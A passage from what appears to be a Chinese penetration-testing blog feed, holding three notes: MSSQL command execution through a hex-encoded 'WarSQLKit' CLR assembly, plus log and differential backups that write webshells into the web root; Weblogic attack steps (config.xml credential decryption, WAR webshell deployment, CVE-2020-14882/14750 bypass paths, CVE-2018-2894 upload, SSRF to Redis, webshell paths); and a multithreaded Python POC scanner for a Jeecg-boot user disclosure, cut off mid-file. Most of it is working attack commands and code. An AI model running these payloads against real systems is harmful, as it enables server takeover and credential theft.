0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;</span><br><span class="line">--创建存储过程,单独执行</span><br><span class="line">CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;</span><br><span class="line">--执行命令</span><br><span class="line">EXEC sp_cmdExec &#x27;whoami&#x27;;</span><br><span class="line">--删除该程序集</span><br><span class="line">DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit];</span><br></pre></td></tr></table></figure><h2 id="db-owner权限"><a href="#db-owner权限" class="headerlink" title="db_owner权限"></a>db_owner权限</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a>LOG备份</h3><ul><li>存在数据库备份文件</li><li>网站的绝对路径</li><li>堆叠注入</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter database 数据库名 set RECOVERY FULL;   --修改数据库恢复模式为 完整模式</span><br><span class="line">create table cmd (a image);        --创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line">backup log 数据库名 to disk= &#x27;C:\phpstudy\WWW\1.php&#x27; with init;   --备份表到指定路径</span><br><span class="line">insert into cmd (a) values(木马十六进制);  --插入一句话到cmd表里</span><br><span class="line">backup log 数据库名 to disk=&#x27;C:\phpstudy\WWW\2.php&#x27;;   --把操作日志备份到指定文件</span><br><span class="line">drop table cmd;    --删除cmd表</span><br></pre></td></tr></table></figure><p><code>2.php</code>为木马文件</p><h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h3><blockquote><p>注：差异备份有概率会把网站搞崩，所以不建议使用差异备份</p></blockquote><ul><li>网站的绝对路径</li><li>堆叠注入</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table [dbo].[test] ([cmd] [image])</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x6b 68617a backup log @a to disk = @s with init,no_truncate</span><br><span class="line"></span><br><span class="line">insert into [test](cmd) values(木马十六进制)</span><br><span class="line"></span><br><span class="line">declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=绝对路径十六进制 backup log @a to disk=@s with init,no_truncate</span><br><span class="line"></span><br><span class="line">Drop table [test]</span><br></pre></td></tr></table></figure><h1 id="补充–待学习"><a href="#补充–待学习" class="headerlink" title="补充–待学习"></a>补充–待学习</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MSSQL 2017--Python和R脚本</span><br><span class="line">沙盒命令执行</span><br><span class="line">Agent Job命令执行</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/7534#toc-17">https://xz.aliyun.com/t/7534#toc-17</a></p><p><a href="https://xz.aliyun.com/t/8603">MSSQL GetShell方法 - 先知社区</a></p><p><a href="https://tttang.com/archive/1545/">mssql 提权总结 - 跳跳糖 (tttang.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic漏洞</title>
      <link href="/2023/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BWeblogic/"/>
      <url>/2023/05/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BWeblogic/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/xublog/article/details/45395587">Weblogic控制台中文显示还是英文显示，浏览器语言设置决定的_sxusky的博客-CSDN博客</a></p><h1 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h1><p><img src="/../images/image-20230819124339256.png" alt="image-20230819124339256"></p><p>第一次访问路径</p><p><img src="/../images/image-20230819131045739.png" alt="image-20230819131045739"></p><p>&#x2F;console 管理台页面和版本</p><p><img src="/../images/image-20230819150256846.png" alt="image-20230819150256846"></p><h1 id="版本号判断"><a href="#版本号判断" class="headerlink" title="版本号判断"></a>版本号判断</h1><p><img src="/../images/image-20230919094414813.png" alt="image-20230919094414813"></p><p><a href="https://mp.weixin.qq.com/s/z6q1sBYcHYgzvak98QQmeA">第21篇：判断Weblogic详细版本号的方法总结 (qq.com)</a></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><blockquote><p>Weblogic洞实在太多了。。</p></blockquote><h2 id="配合文件读取来读取管理员账密"><a href="#配合文件读取来读取管理员账密" class="headerlink" title="配合文件读取来读取管理员账密"></a>配合文件读取来读取管理员账密</h2><p>config.xml：搜索<code>&lt;node-manager-password-encrypted&gt;</code></p><p><img src="/../images/image-20230819133229460.png" alt="image-20230819133229460"></p><p>密码解密</p><ul><li>密钥：SerializedSystemIni.dat（二进制文件，使用burp保存）</li><li>解密</li></ul><h2 id="进入管理界面部署war包"><a href="#进入管理界面部署war包" class="headerlink" title="进入管理界面部署war包"></a>进入管理界面部署war包</h2><p><img src="/../images/image-20231015112007348.png" alt="image-20231015112007348"></p><p><img src="/../images/image-20231015111953607.png" alt="image-20231015111953607"></p><p><img src="/../images/image-20231015112022950.png" alt="image-20231015112022950"></p><p><img src="/../images/image-20231015112051785.png" alt="image-20231015112051785"></p><p><img src="/../images/image-20231015112107839.png" alt="image-20231015112107839"></p><p><img src="/../images/image-20231015112115661.png" alt="image-20231015112115661"></p><p>访问<code>shell/shell.jsp</code></p><p><img src="/../images/image-20231015112126198.png" alt="image-20231015112126198"></p><h2 id="文件包含–CVE-2022-21371"><a href="#文件包含–CVE-2022-21371" class="headerlink" title="文件包含–CVE-2022-21371"></a>文件包含–CVE-2022-21371</h2><p>影响版本：12.1.3.0.0 &#x2F; 12.2.1.3.0 &#x2F; 12.2.1.4.0 &#x2F; 14.1.1.0.0</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET .//META-INF/MANIFEST.MF</span><br><span class="line">GET .//WEB-INF/web.xml</span><br><span class="line">GET .//WEB-INF/portlet.xml</span><br><span class="line">GET .//WEB-INF/weblogic.xml</span><br></pre></td></tr></table></figure><h2 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF-CVE-2014-4210"></a>SSRF-<strong>CVE-2014-4210</strong></h2><p>漏洞位置在<code>uddiexplorer/SearchPublicRegistries.jsp</code></p><p><img src="/../images/11921423-e5720550a86f7853.png" alt="img"></p><p>搜索<code>An error has occurred</code>定位返回值</p><p>访问存在的端口，返回<code>状态码</code></p><p><img src="/../images/image-20230819125030914.png" alt="image-20230819125030914"></p><p>访问不存在的端口，返回<code>could not connect over HTTP to server</code></p><p><img src="/../images/image-20230819124951962.png" alt="image-20230819124951962"></p><p>如果访问的端口不是http协议，则会返回<code>did not have a valid SOAP content-type</code></p><p><strong>服务探测总结</strong></p><p><img src="/../images/%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell5.png" alt="img"></p><p><strong>SSRF打Redis</strong></p><blockquote><p>在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p></blockquote><h2 id="任意文件上传漏洞（CVE-2018-2894）"><a href="#任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="任意文件上传漏洞（CVE-2018-2894）"></a>任意文件上传漏洞（CVE-2018-2894）</h2><p><a href="https://paper.seebug.org/647">https://paper.seebug.org/647</a></p><p>产生原因</p><ul><li><p>需要知道部署应用的web目录</p></li><li><p>开启了Web Service Test Page，开发模式下可未授权访问&#x2F;ws_utc&#x2F;Config.do或者认证后访问&#x2F;ws_utc&#x2F;begin.do</p></li></ul><p>复现</p><p>首先需要设置home dir为静态目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819140901725.png" alt="image-20230819140901725"></p><ul><li>Config.do</li></ul><p><img src="/../images/image-20230819140918874.png" alt="image-20230819140918874"></p><p>返回的数据包</p><p><img src="/../images/image-20230819141057345.png" alt="image-20230819141057345"></p><p>上传后的文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/config/keystore/[时间戳]_[文件名]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819141140037.png" alt="image-20230819141140037"></p><ul><li>begin.do</li></ul><p><img src="/../images/image-20230819141750335.png" alt="image-20230819141750335"></p><p><img src="/../images/image-20230819142834936.png" alt="image-20230819142834936"></p><p><img src="/../images/image-20230819143904277.png" alt="image-20230819143904277"></p><p>将发送的时间戳进行转换：2023-08-19 06:27:55.426</p><p>服务器实际上的</p><p><img src="/../images/image-20230819143328926.png" alt="image-20230819143328926"></p><p>所以毫秒处需要进行爆破</p><p>上传后的文件位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[毫秒]/import_file_name_[文件名]</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230819143749107.png" alt="image-20230819143749107"></p><h2 id="身份校验绕过"><a href="#身份校验绕过" class="headerlink" title="身份校验绕过"></a>身份校验绕过</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2020-14750</span></span><br><span class="line">/console/images/%252E./console.portal</span><br><span class="line">/console/css/%252E./console.portal</span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2020-14882</span></span><br><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br><span class="line">/console/images/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p><a href="https://xz.aliyun.com/t/10365">Weblogic漏洞学习：T3反序列化 - 先知社区 (aliyun.com)</a></p><p><a href="https://xz.aliyun.com/t/10323">Weblogic Xmldecoder反序列化中的命令回显与内存马总结 - 先知社区 (aliyun.com)</a></p><ul><li>直接通过T3协议发送恶意反序列化对象</li><li>利用T3协议&#x2F;IIOP协议配合RMP或ND接口反向发送反序列化数据</li><li>通过 javabean XML方式发送反序列化数据。</li></ul><h3 id="T3协议数据包"><a href="#T3协议数据包" class="headerlink" title="T3协议数据包"></a>T3协议数据包</h3><blockquote><p>第二到第七部分内容，开头都是<code>ac ed 00 05</code>，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了</p></blockquote><p><img src="/../images/WcnkRK.png" alt="img"></p><p><img src="/../images/WcnYLQ.jpg" alt="img"></p><h3 id="Payload数据包"><a href="#Payload数据包" class="headerlink" title="Payload数据包"></a>Payload数据包</h3><p><img src="/../images/Wcm5rQ.png" alt="img"></p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p><a href="https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA">https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA</a></p><p>文件包含判断版本号？</p><p><img src="/../images/image-20230919095124958.png" alt="image-20230919095124958"></p><p><img src="/../images/image-20230919095037612.png" alt="image-20230919095037612"></p><ul><li><p>weblogic_scanner</p><p>这个工具经常提示需要进一步验证的两个漏洞（没成功过。。）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-2618：需要知道weblogic的管理员账密进行任意文件上次上传</span><br><span class="line">CVE-2019-2888：先起一个恶意的xxe服务，再用exp打</span><br></pre></td></tr></table></figure></li></ul><h2 id="Web路径"><a href="#Web路径" class="headerlink" title="Web路径"></a>Web路径</h2><p><a href="https://chaserw.github.io/2021/11/05/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84weblogic%E4%B8%8A%E4%BC%A0webshell/">记一次曲折的weblogic上传webshell | chaser’s Blog (chaserw.github.io)</a></p><p>假设上传的jsp为<code>shell.jsp</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 物理路径</span></span><br><span class="line">/Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp</span><br><span class="line"><span class="comment"># 访问路径</span></span><br><span class="line">https://xx.com/console/framework/skins/wlsconsole/images/shell.jsp</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 物理路径</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/随机字符/war/shell.jsp</span><br><span class="line"><span class="comment"># 访问路径</span></span><br><span class="line">https://xx.com/bea_wls_internal/shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 物理路径</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/随机字符/war/shell.jsp</span><br><span class="line"><span class="comment"># 访问路径</span></span><br><span class="line">https://xx.com/uddiexplorer/shell.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 物理路径</span></span><br><span class="line">/Oracle/Middleware/user_projects/domains/application/servers/AdminServer/tmp/_WL_user/项目名/随机字符/war/shell.jsp</span><br><span class="line"><span class="comment"># 访问路径</span></span><br><span class="line">https://xx.com/项目名/shell.jsp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>POC编写</title>
      <link href="/2023/05/01/python%E8%84%9A%E6%9C%AC/"/>
      <url>/2023/05/01/python%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="单个POC模板"><a href="#单个POC模板" class="headerlink" title="单个POC模板"></a>单个POC模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> response</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">from</span> weakref <span class="keyword">import</span> proxy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> init</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore</span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">POC</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.banner()</span><br><span class="line">        self.args = self.parseArgs()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.args.file:</span><br><span class="line">            self.init()</span><br><span class="line">            self.urlList = self.loadURL()  </span><br><span class="line">            self.multiRun()</span><br><span class="line">            self.start = time.time()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.verfyurl()  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">banner</span>(<span class="params">self</span>):</span><br><span class="line">        logo = <span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                                     .__          </span></span><br><span class="line"><span class="string">  ____ ___  ________    _____ ______ |  |   ____  </span></span><br><span class="line"><span class="string">_/ __ \\  \/  /\__  \  /     \\____ \|  | _/ __ \ </span></span><br><span class="line"><span class="string">\  ___/ &gt;    &lt;  / __ \|  Y Y  \  |_&gt; &gt;  |_\  ___/ </span></span><br><span class="line"><span class="string"> \___  &gt;__/\_ \(____  /__|_|  /   __/|____/\___  &gt;</span></span><br><span class="line"><span class="string">     \/      \/     \/      \/|__|             \/                                                                                                  </span></span><br><span class="line"><span class="string">                                            author： Khaz</span></span><br><span class="line"><span class="string">                                            GitHub： https://github.com/Khaz</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[91m&quot;</span> + logo + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parseArgs</span>(<span class="params">self</span>):</span><br><span class="line">        date = time.strftime(<span class="string">&quot;%Y-%m-%d_%H-%M-%S&quot;</span>, time.localtime())</span><br><span class="line">        parser = ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Target url(e.g. http://127.0.0.1)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">f&quot;Target file(e.g. url.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--thread&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">5</span>, <span class="built_in">help</span>=<span class="string">f&quot;Number of thread (default 5)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-T&quot;</span>, <span class="string">&quot;--timeout&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,  <span class="built_in">help</span>=<span class="string">&quot;Request timeout (default 3)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=date,  <span class="built_in">help</span>=<span class="string">f&quot;Vuln url output file (e.g. result.txt)&quot;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--proxy&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Request Proxy (e.g http://127.0.0.1:8080)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proxy_server</span>(<span class="params">self</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        <span class="keyword">return</span> proxy</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化脚本配置</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nthread:&quot;</span>, self.args.thread)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timeout:&quot;</span>, self.args.timeout)</span><br><span class="line">        msg = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(self.args.file):</span><br><span class="line">            msg += <span class="string">&quot;Load url file successfully\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg += <span class="string">f&quot;\033[31mLoad url file <span class="subst">&#123;self.args.file&#125;</span> failed\033[0m\n&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;failed&quot;</span> <span class="keyword">in</span> msg:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Init failed, Please check the environment.&quot;</span>)</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Init successfully&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回poc的返回包</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">respose</span>(<span class="params">self, url</span>):</span><br><span class="line">        proxy = self.args.proxy</span><br><span class="line">        proxies = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> proxy:</span><br><span class="line">            proxies = &#123;<span class="string">&quot;http&quot;</span>: proxy, <span class="string">&quot;https&quot;</span>: proxy&#125;</span><br><span class="line">        path = <span class="string">&quot;/jeecg-boot/sys/user/querySysUser?username=admin&quot;</span></span><br><span class="line">        url = urljoin(url, path)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)           </span><br><span class="line">            resp = response.text</span><br><span class="line">            <span class="keyword">return</span> resp               </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;conn&quot;</span>  </span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 单条url检测</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verfyurl</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.args.url</span><br><span class="line">        repData = self.respose(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(Fore.GREEN +<span class="string">&quot;[+] 漏洞存在！！！[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))        </span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] URL连接失败！ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[x] 未检测到漏洞！[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 多条url检测</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, url</span>):</span><br><span class="line">            repData = self.respose(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\&quot;username\&quot;:\&quot;admin\&quot;&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = Fore.GREEN +<span class="string">&quot;[+] 漏洞存在！！！[+] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">                self.lock.acquire()</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    self.findCount +=<span class="number">1</span></span><br><span class="line">                    self.vulnRULList.append(url)</span><br><span class="line">                <span class="keyword">finally</span>:</span><br><span class="line">                    self.lock.release()</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;conn&quot;</span> <span class="keyword">in</span> repData:</span><br><span class="line">                msg = <span class="string">&quot;[-] URL连接失败！ [-] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                msg = <span class="string">&quot;[x] 未检测到漏洞！[x] url: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">            self.lock.acquire()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(msg)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                self.lock.release()</span><br><span class="line">       </span><br><span class="line">    <span class="comment"># 导入文件中的url</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">loadURL</span>(<span class="params">self</span>):</span><br><span class="line">        urlList = []</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.args.file, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> f.readlines():</span><br><span class="line">                u = u.strip()</span><br><span class="line">                urlList.append(u)</span><br><span class="line">        <span class="keyword">return</span> urlList</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 多线程</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">multiRun</span>(<span class="params">self</span>):</span><br><span class="line">        self.findCount = <span class="number">0</span></span><br><span class="line">        self.vulnRULList = []</span><br><span class="line">        self.lock = Lock()</span><br><span class="line">        executor = ThreadPoolExecutor(max_workers=self.args.thread)</span><br><span class="line">        <span class="keyword">if</span> self.args.url:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.url)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            executor.<span class="built_in">map</span>(self.verify, self.urlList)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存结果</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">output</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(<span class="string">r&quot;./output&quot;</span>):</span><br><span class="line">            os.mkdir(<span class="string">r&quot;./output&quot;</span>)</span><br><span class="line">        self.outputFile = <span class="string">f&quot;./output/<span class="subst">&#123;self.args.output&#125;</span>.txt&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(self.outputFile, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> self.vulnRULList:</span><br><span class="line">                f.write(url + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 结果统计输出</span></span><br><span 